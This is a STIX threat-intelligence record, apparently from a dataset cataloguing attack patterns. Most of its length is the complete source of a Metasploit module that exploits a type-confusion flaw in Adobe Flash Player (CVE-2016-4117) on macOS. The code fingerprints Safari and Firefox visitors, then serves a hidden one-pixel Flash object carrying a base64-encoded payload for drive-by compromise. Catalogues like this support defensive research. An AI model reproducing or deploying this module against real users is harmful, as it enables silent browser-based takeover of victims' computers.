{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c62165e9-7a66-49da-b18e-bb93687da6cc",
    "created": "2024-08-14T16:34:26.55002Z",
    "modified": "2024-08-14T16:34:26.550024Z",
    "name": "Adobe Flash Player DeleteRangeTimelineOperation Type-Confusion",
    "description": "( This module exploits a type confusion on Adobe Flash Player, which was originally found being successfully exploited in the wild. This module has been tested successfully on: macOS Sierra 10.12.3 Safari and Adobe Flash Player 21.0.0.182 Firefox and Adobe Flash Player 21.0.0.182. ) 'License'             => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/browser/adobe_flash_delete_range_tl_op.rb",
            "external_id": "adobe_flash_delete_range_tl_op.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-4117"
        },
        {
            "source_name": "reference",
            "url": "https://www.fireeye.com/blog/threat-research/2016/05/cve-2016-4117-flash-zero-day.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.securitytracker.com/id/1035826"
        },
        {
            "source_name": "reference",
            "url": "https://helpx.adobe.com/security/products/flash-player/apsa16-02.html"
        },
        {
            "source_name": "reference",
            "url": "https://helpx.adobe.com/security/products/flash-player/apsb16-15.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'                => 'Adobe Flash Player DeleteRangeTimelineOperation Type-Confusion',\n      'Description'         => %q(\n       This module exploits a type confusion on Adobe Flash Player, which was\n       originally found being successfully exploited in the wild. This module\n       has been tested successfully on:\n         macOS Sierra 10.12.3,\n         Safari and Adobe Flash Player 21.0.0.182,\n         Firefox and Adobe Flash Player 21.0.0.182.\n      ),\n      'License'             => MSF_LICENSE,\n      'Author'              =>\n        [\n          'Genwei Jiang', # FireEye original blog details on the vulnerability\n          'bcook-r7'      # Imported Metasploit module\n        ],\n      'References'          =>\n        [\n          ['CVE', '2016-4117'],\n          ['BID', '90505'],\n          ['URL', 'https://www.fireeye.com/blog/threat-research/2016/05/cve-2016-4117-flash-zero-day.html'],\n          ['URL', 'http://www.securitytracker.com/id/1035826'],\n          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsa16-02.html'],\n          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsb16-15.html'],\n        ],\n      'Payload'             =>\n        {\n          'DisableNops' => true\n        },\n      'Platform'            => ['osx'],\n      'BrowserRequirements' =>\n        {\n          source: /script|headers/i,\n          os_name: lambda do |os|\n            os =~ OperatingSystems::Match::MAC_OSX\n          end,\n          ua_name: lambda do |ua|\n            case target.name\n            when 'Mac OS X'\n              return true if ua == Msf::HttpClients::SAFARI\n              return true if ua == Msf::HttpClients::FF\n            end\n\n            false\n          end,\n          flash: lambda do |ver|\n            case target.name\n            when 'Mac OS X'\n              return true if Rex::Version.new(ver) <= Rex::Version.new('21.0.0.182')\n            end\n\n            false\n          end\n        },\n      'Targets'             =>\n        [\n          [\n            'Mac OS X', {\n              'Platform' => 'osx',\n              'Arch' => ARCH_X64\n            }\n          ]\n        ],\n      'Privileged'          => false,\n      'DisclosureDate'      => '2016-04-27',\n      'DefaultTarget'       => 0))\n  end\n\n  def exploit\n    @swf = create_swf\n\n    super\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Request: #{request.uri}\")\n\n    if request.uri.end_with? 'swf'\n      print_status('Sending SWF...')\n      send_response(cli, @swf, 'Content-Type' => 'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache')\n      return\n    end\n\n    print_status('Sending HTML...')\n    send_exploit_html(cli, exploit_template(cli, target_info), 'Pragma' => 'no-cache')\n  end\n\n  def exploit_template(cli, target_info)\n    swf_random = \"#{rand_text_alpha(3..7)}.swf\"\n    target_payload = get_payload(cli, target_info)\n    b64_payload = Rex::Text.encode_base64(target_payload)\n\n    if target.name.include? 'osx'\n      platform_id = 'osx'\n    end\n    html_template = %(<html>\n    <body>\n    <object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\" width=\"1\" height=\"1\" />\n    <param name=\"movie\" value=\"<%=swf_random%>\" />\n    <param name=\"allowScriptAccess\" value=\"always\" />\n    <param name=\"FlashVars\" value=\"sh=<%=b64_payload%>&pl=<%=platform_id%>\" />\n    <param name=\"Play\" value=\"true\" />\n    <embed type=\"application/x-shockwave-flash\" width=\"1\" height=\"1\" src=\"<%=swf_random%>\" allowScriptAccess=\"always\" FlashVars=\"sh=<%=b64_payload%>&pl=<%=platform_id%>\" Play=\"true\"/>\n    </object>\n    </body>\n    </html>\n    )\n\n    return html_template, binding\n  end\n\n  def create_swf\n    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2016-4117', 'msf.swf')\n    File.binread(path)\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-04-27",
    "x_mitre_platforms": [
        "osx'"
    ]
}